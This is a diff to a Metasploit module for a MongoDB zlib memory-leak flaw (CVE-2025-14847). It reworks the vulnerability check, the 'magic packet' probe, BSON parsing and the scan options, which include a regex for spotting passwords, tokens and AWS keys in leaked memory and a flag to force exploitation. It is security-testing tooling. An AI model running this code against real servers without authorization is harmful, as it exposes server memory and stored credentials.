@@ -43,12 +43,7 @@ class MetasploitModule < Msf::Auxiliary
           'Stability' => [CRASH_SAFE],
           'SideEffects' => [IOC_IN_LOGS],
           'Reliability' => [REPEATABLE_SESSION]
-        },
-        'Actions' => [
-          ['SCAN', { 'Description' => 'Scan and exploit memory leak vulnerability' }],
-          ['CHECK', { 'Description' => 'Quick vulnerability check using Wiz magic packet' }]
-        ],
-        'DefaultAction' => 'SCAN'
+        }
       )
     )
 
@@ -56,13 +51,13 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(27017),
         OptInt.new('MIN_OFFSET', [true, 'Minimum BSON document length offset', 20]),
-        OptInt.new('MAX_OFFSET', [true, 'Maximum BSON document length offset', 8192]),
+        OptInt.new('MAX_OFFSET', [true, 'Maximum BSON document length offset (higher = more memory, slower)', 8192]),
         OptInt.new('STEP_SIZE', [true, 'Offset increment (higher = faster, less thorough)', 1]),
         OptInt.new('BUFFER_PADDING', [true, 'Padding added to buffer size claim', 500]),
-        OptInt.new('LEAK_THRESHOLD', [true, 'Minimum bytes to report as interesting leak', 10]),
-        OptBool.new('QUICK_SCAN', [true, 'Quick scan mode - sample key offsets only', false]),
-        OptInt.new('REPEAT', [true, 'Number of scan passes (more passes = more data)', 1]),
-        OptBool.new('REUSE_CONNECTION', [true, 'Reuse TCP connection for faster scanning', true])
+        OptInt.new('LEAK_THRESHOLD', [true, 'Minimum bytes to report as interesting leak in output', 10]),
+        OptBool.new('QUICK_SCAN', [true, 'Quick scan mode - sample key offsets only, faster but may miss leaks', false]),
+        OptInt.new('REPEAT', [true, 'Number of scan passes - memory changes over time so more passes capture more data', 1]),
+        OptBool.new('REUSE_CONNECTION', [true, 'Reuse TCP connection for faster scanning (10-50x speedup)', true])
       ]
     )
 
@@ -73,8 +68,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('SECRETS_PATTERN', [true, 'Regex pattern to detect sensitive data', 'password|secret|key|token|admin|AKIA|Bearer|mongodb://|mongo:|conn|auth']),
         OptBool.new('FORCE_EXPLOIT', [true, 'Attempt exploitation even if version check indicates not vulnerable', false]),
         OptInt.new('PROGRESS_INTERVAL', [true, 'Show progress every N offsets (0 to disable)', 500]),
-        OptBool.new('SAVE_RAW_RESPONSES', [true, 'Save all raw responses for offline analysis', false]),
-        OptBool.new('SAVE_JSON', [true, 'Save leaked data as JSON with metadata', true])
+        OptBool.new('SAVE_RAW_RESPONSES', [true, 'Save all raw responses for offline analysis with tools like strings, binwalk, etc.', false]),
+        OptBool.new('SAVE_JSON', [true, 'Save leaked data as JSON report with metadata for automated processing', true])
       ]
     )
   end
@@ -100,73 +95,56 @@ class MetasploitModule < Msf::Auxiliary
   ].join.freeze
 
   #
-  # Quick vulnerability check using Wiz Research magic packet
+  # Standard check method for the framework's `check` command.
+  # Returns CheckCode values based on version fingerprinting and
+  # a magic packet probe to confirm exploitability.
   #
-  def run_check(ip)
-    print_status("Running vulnerability check against #{ip}:#{rport}...")
-
-    # First get version info
+  def check_host(_ip)
+    # First, confirm we are talking to MongoDB. If neither version detection
+    # nor compressor negotiation succeeds, the target is not MongoDB and we
+    # should not probe further to avoid false positives.
     version_info = get_mongodb_version
+    compressors = get_server_compressors
+    is_mongodb = !version_info.nil? || !compressors.nil?
+
+    return Exploit::CheckCode::Safe('Target does not appear to be a MongoDB service') unless is_mongodb
+
     if version_info
       version_str = version_info[:version]
-      print_status("MongoDB version: #{version_str}")
       vuln_status = check_vulnerable_version(version_str)
 
-      case vuln_status
-      when :patched
-        print_error("Version #{version_str} is PATCHED - not vulnerable")
-        return :safe
-      when :vulnerable, :vulnerable_eol
-        print_good("Version #{version_str} appears vulnerable, confirming with probe...")
-      when :unknown
-        print_warning("Version #{version_str} - vulnerability status unknown, testing...")
-      end
-    else
-      print_warning('Could not determine MongoDB version, testing anyway...')
+      return Exploit::CheckCode::Safe("Version #{version_str} is patched") if vuln_status == :patched
     end
 
-    # Check if zlib compression is enabled
-    compressors = get_server_compressors
-    if compressors
-      print_status("Server compressors: #{compressors.join(', ')}")
-      unless compressors.include?('zlib')
-        print_error('Server does not have zlib compression enabled (required for this vulnerability)')
-        return :safe
-      end
-    else
-      print_warning('Could not determine server compression support, testing anyway...')
+    if compressors && !compressors.include?('zlib')
+      version_msg = version_info ? " (MongoDB #{version_info[:version]})" : ''
+      compressor_msg = compressors.empty? ? '' : " - server compressors: #{compressors.join(', ')}"
+      return Exploit::CheckCode::Safe("Server does not have zlib compression enabled#{version_msg}#{compressor_msg}")
     end
 
     # Send the Wiz magic packet to confirm exploitability
-    print_status('Sending Wiz magic packet to confirm vulnerability...')
     result = send_magic_packet_check
     case result
     when :vulnerable
       version_msg = version_info ? " (MongoDB #{version_info[:version]})" : ''
-      print_good("VULNERABLE - Server leaks memory via CVE-2025-14847#{version_msg}")
-
-      # Report the vulnerability
-      report_vuln(
-        host: ip,
-        port: rport,
-        proto: 'tcp',
-        name: name,
-        refs: references,
-        info: "Confirmed vulnerable via magic packet check#{version_msg}"
-      )
-      return :vulnerable
+      return Exploit::CheckCode::Vulnerable("Server leaks memory via crafted OP_COMPRESSED message#{version_msg}")
     when :safe
-      print_status('Server did not leak memory (may be patched or zlib disabled)')
-      return :safe
-    when :detected
-      version_msg = version_info ? " (MongoDB #{version_info[:version]})" : ''
-      print_warning("Server appears to be MongoDB#{version_msg}, but could not confirm vulnerability")
-      print_status('Try running with ACTION=SCAN for full exploitation attempt')
-      return :detected
+      return Exploit::CheckCode::Safe('Server did not leak memory')
     else
-      print_error('Could not determine vulnerability status')
-      return :unknown
+      # :unknown — probe was inconclusive, fall back to version-based detection
+      if version_info
+        vuln_status = check_vulnerable_version(version_info[:version])
+        if vuln_status == :vulnerable || vuln_status == :vulnerable_eol
+          return Exploit::CheckCode::Appears("Version #{version_info[:version]} is in the vulnerable range")
+        end
+
+        return Exploit::CheckCode::Detected("MongoDB #{version_info[:version]} detected")
+      end
+
+      Exploit::CheckCode::Unknown('Magic packet probe was inconclusive and version unknown')
     end
+  rescue ::Rex::ConnectionError, ::Errno::ECONNRESET, ::Timeout::Error
+    Exploit::CheckCode::Unknown('Could not connect to the target')
   end
 
   #
@@ -181,40 +159,47 @@ class MetasploitModule < Msf::Auxiliary
     disconnect
 
     return :unknown if response.nil? || response.empty?
+    return :unknown if response.length < 16
 
-    # Check for BSON signatures in response indicating memory leak
-    # The Wiz template checks for 'BSON' in the zlib-decoded response or raw response
+    # Validate this looks like a MongoDB wire protocol response before
+    # inspecting content. Without this gate, HTTP error pages or other
+    # protocol responses can cause false positives.
+    msg_len = response[0, 4].unpack1('V')
+    opcode = response[12, 4].unpack1('V')
+    return :unknown unless msg_len >= 16 && msg_len <= response.length
+    return :unknown unless [OP_REPLY, OP_MSG, OP_COMPRESSED].include?(opcode)
+
     leaked = false
 
-    # Try to decompress and check
+    # Try to decompress OP_COMPRESSED responses and check for leak indicators
+    payload = nil
     begin
-      if response.length > 25
-        opcode = response[12, 4].unpack1('V')
-        if opcode == OP_COMPRESSED
-          raw = Zlib::Inflate.inflate(response[25..])
-          leaked = true if raw&.upcase&.include?('BSON')
-        end
+      if opcode == OP_COMPRESSED && response.length > 25
+        payload = Zlib::Inflate.inflate(response[25, msg_len - 25])
       end
     rescue Zlib::Error
-      # Decompression failed, check raw response
+      # Decompression failed — can't meaningfully scan compressed bytes
+      return :unknown
     end
 
-    # Check raw response for BSON markers
-    leaked = true if response.upcase.include?('BSON')
+    # For uncompressed OP_MSG or OP_REPLY, extract the payload
+    payload ||= if opcode == OP_REPLY && response.length > 36
+                  response[36, msg_len - 36]
+                elsif opcode == OP_MSG && response.length > 16
+                  response[16, msg_len - 16]
+                end
 
-    # Also check for other leak indicators (field name errors, type errors)
-    leaked = true if response =~ /field name '[^']+'/
-    leaked = true if response =~ /unrecognized.*type/i
+    if payload
+      # Only match MongoDB-specific error patterns, not generic strings
+      leaked = true if payload.include?('BSON')
+      leaked = true if payload =~ /field name '[^']+'/
+      leaked = true if payload =~ /unrecognized BSON type/i
+    end
 
     return :vulnerable if leaked
 
-    # If we got a valid MongoDB response but no leak, server might be patched
-    if response.length >= 16
-      msg_len = response.unpack1('V')
-      return :safe if msg_len > 0 && msg_len <= response.length
-    end
-
-    :detected
+    # Valid MongoDB response but no leak — server is likely patched
+    :safe
   rescue ::Rex::ConnectionError, ::Errno::ECONNRESET
     :unknown
   rescue StandardError => e
@@ -233,25 +218,24 @@ class MetasploitModule < Msf::Auxiliary
   #
   def get_server_compressors
     connect
-    # Send hello command to get server capabilities
+    # Try hello first (MongoDB 5.0+), fall back to isMaster (MongoDB 4.x)
     response = send_command('admin', { 'hello' => 1, 'compression' => ['zlib', 'snappy', 'zstd'] })
+    response ||= send_command('admin', { 'isMaster' => 1, 'compression' => ['zlib', 'snappy', 'zstd'] })
     disconnect
 
     return nil if response.nil?
 
-    # Parse compression field from response
+    # The response is raw BSON, not JSON. Compressor names appear as
+    # null-terminated strings within the BSON compression array field.
+    # A simple string inclusion check reliably detects them.
     compressors = []
-    if response =~ /compression.*?\[(.*?)\]/m
-      compressor_list = ::Regexp.last_match(1)
-      compressors << 'zlib' if compressor_list.include?('zlib')
-      compressors << 'snappy' if compressor_list.include?('snappy')
-      compressors << 'zstd' if compressor_list.include?('zstd')
-    end
+    compressors << 'zlib' if response.include?('zlib')
+    compressors << 'snappy' if response.include?('snappy')
+    compressors << 'zstd' if response.include?('zstd')
 
-    # Also check raw bytes for compressor strings
-    compressors << 'zlib' if response.include?('zlib') && !compressors.include?('zlib')
-
-    compressors.empty? ? nil : compressors
+    compressors
+  rescue ::Rex::ConnectionError, ::Errno::ECONNRESET, ::Timeout::Error
+    raise
   rescue StandardError
     nil
   ensure
@@ -294,19 +278,17 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-    case action.name
-    when 'CHECK'
-      run_check(ip)
-    when 'SCAN'
-      run_scan(ip)
-    else
-      print_error("Unknown action: #{action.name}")
-    end
+    run_scan(ip)
   end
 
   def run_scan(ip)
     # Version detection and vulnerability check
-    version_info = get_mongodb_version
+    begin
+      version_info = get_mongodb_version
+    rescue ::Rex::ConnectionError, ::Errno::ECONNRESET, ::Timeout::Error => e
+      print_error("Cannot reach #{Rex::Socket.to_authority(ip, rport)} - #{e.message}")
+      return
+    end
 
     if version_info
       version_str = version_info[:version]
@@ -329,15 +311,25 @@ class MetasploitModule < Msf::Auxiliary
         print_warning("Version #{version_str} - vulnerability status unknown")
         print_status('Proceeding with exploitation attempt...')
       end
-    else
-      print_warning('Could not determine MongoDB version')
-      print_status('Proceeding with exploitation attempt...')
     end
 
     # Check compression support
-    compressors = get_server_compressors
+    begin
+      compressors = get_server_compressors
+    rescue ::Rex::ConnectionError, ::Errno::ECONNRESET, ::Timeout::Error => e
+      print_error("Cannot reach #{Rex::Socket.to_authority(ip, rport)} - #{e.message}")
+      return
+    end
+
+    # If neither version detection nor compressor negotiation succeeded,
+    # the target is not a MongoDB service — don't waste time scanning.
+    if version_info.nil? && compressors.nil?
+      print_error('Target does not appear to be a MongoDB service')
+      return
+    end
+
     if compressors
-      print_status("Server compressors: #{compressors.join(', ')}")
+      print_status("Server compressors: #{compressors.empty? ? 'none' : compressors.join(', ')}")
       unless compressors.include?('zlib')
         print_error('Server does not support zlib compression - vulnerability not exploitable')
         print_status('The CVE-2025-14847 vulnerability requires zlib compression to be enabled')
@@ -365,11 +357,10 @@ class MetasploitModule < Msf::Auxiliary
 
     # Parse BSON response to extract version
     parse_build_info(response)
-  rescue ::Rex::ConnectionError, ::Errno::ECONNRESET => e
-    vprint_error("Connection error during version check: #{e.message}")
-    nil
   rescue StandardError => e
     vprint_error("Error getting MongoDB version: #{e.message}")
+    raise if e.is_a?(::Rex::ConnectionError) || e.is_a?(::Errno::ECONNRESET) || e.is_a?(::Timeout::Error)
+
     nil
   ensure
     begin
@@ -405,12 +396,17 @@ class MetasploitModule < Msf::Auxiliary
     response_header = sock.get_once(16, 5)
     return nil if response_header.nil? || response_header.length < 16
 
-    msg_len, _req_id, _resp_to, opcode = response_header.unpack('VVVV')
+    msg_len, _req_id, resp_to, opcode = response_header.unpack('VVVV')
+
+    # Validate this is a genuine MongoDB OP_REPLY: opcode must be 1 and
+    # responseTo must match our requestID. This prevents interpreting
+    # responses from non-MongoDB services (e.g. HTTP) as valid data.
     return nil unless opcode == OP_REPLY
+    return nil unless resp_to == request_id
 
     # Read rest of response
     remaining = msg_len - 16
-    return nil if remaining <= 0
+    return nil if remaining <= 0 || remaining > 0x01000000 # sanity: cap at 16 MB (MongoDB max)
 
     response_body = sock.get_once(remaining, 5)
     return nil if response_body.nil?
@@ -450,11 +446,36 @@ class MetasploitModule < Msf::Auxiliary
         doc << "\x08"                        # boolean type
         doc << "#{key}\x00"
         doc << (value ? "\x01" : "\x00")
+      when Array
+        doc << "\x04"                        # array type
+        doc << "#{key}\x00"
+        doc << build_bson_array(value)
       end
     end
 
     doc << "\x00" # Document terminator
     [doc.length + 4].pack('V') + doc # Prepend document length
+  end
+
+  def build_bson_array(array)
+    doc = ''.b
+
+    array.each_with_index do |value, index|
+      case value
+      when String
+        doc << "\x02"
+        doc << "#{index}\x00"
+        doc << [value.length + 1].pack('V')
+        doc << "#{value}\x00"
+      when Integer
+        doc << "\x10"
+        doc << "#{index}\x00"
+        doc << [value].pack('V')
+      end
+    end
+
+    doc << "\x00"
+    [doc.length + 4].pack('V') + doc
   end
 
   def parse_build_info(bson_data)
@@ -524,18 +545,25 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def try_hello_command
-    begin
-      response = send_command('admin', { 'hello' => 1 })
-      return nil if response.nil?
+    connect
+    response = send_command('admin', { 'hello' => 1 })
+    disconnect
+    return nil if response.nil?
 
-      # Look for version string in response
-      if response =~ /(\d+\.\d+\.\d+)/
-        return ::Regexp.last_match(1)
-      end
+    # Look for version string in response
+    if response =~ /(\d+\.\d+\.\d+)/
+      return ::Regexp.last_match(1)
+    end
+
+    nil
+  rescue StandardError
+    nil
+  ensure
+    begin
+      disconnect
     rescue StandardError
       nil
     end
-    nil
   end
 
   def exploit_memory_leak(ip, version_info)
@@ -874,9 +902,16 @@ class MetasploitModule < Msf::Auxiliary
   def recv_mongo_response_from(socket)
     # Read header first (16 bytes minimum)
     header = socket.get_once(16, 2)
-    return nil if header.nil? || header.length < 4
+    return nil if header.nil? || header.length < 16
 
-    msg_len = header.unpack1('V')
+    msg_len = header[0, 4].unpack1('V')
+    opcode = header[12, 4].unpack1('V')
+
+    # Validate this looks like a MongoDB wire protocol response.
+    # Reject obviously non-MongoDB data (e.g. HTTP responses) early.
+    return nil unless [OP_REPLY, OP_MSG, OP_COMPRESSED].include?(opcode)
+    return nil if msg_len < 16 || msg_len > 0x01000000 # cap at 16 MB
+
     return header if msg_len <= 16
 
     # Read remaining data
@@ -903,10 +938,11 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       msg_len = response.unpack1('V')
-      return [] if msg_len > response.length
+      return [] if msg_len > response.length || msg_len < 16
 
-      # Check if response is compressed (opcode at offset 12)
+      # Validate this is a MongoDB wire protocol response
       opcode = response[12, 4].unpack1('V')
+      return [] unless [OP_REPLY, OP_MSG, OP_COMPRESSED].include?(opcode)
 
       raw = nil
       if opcode == OP_COMPRESSED
@@ -918,8 +954,10 @@ class MetasploitModule < Msf::Auxiliary
           raw = response[25, msg_len - 25]
         end
       else
-        # Uncompressed OP_MSG - skip header
-        raw = response[16, msg_len - 16]
+        # OP_REPLY has a 20-byte reply header after the 16-byte message header (offset 36)
+        # OP_MSG payload starts after the 16-byte message header (offset 16)
+        offset = opcode == OP_REPLY ? 36 : 16
+        raw = response[offset, msg_len - offset] if response.length > offset
       end
 
       return [] if raw.nil?
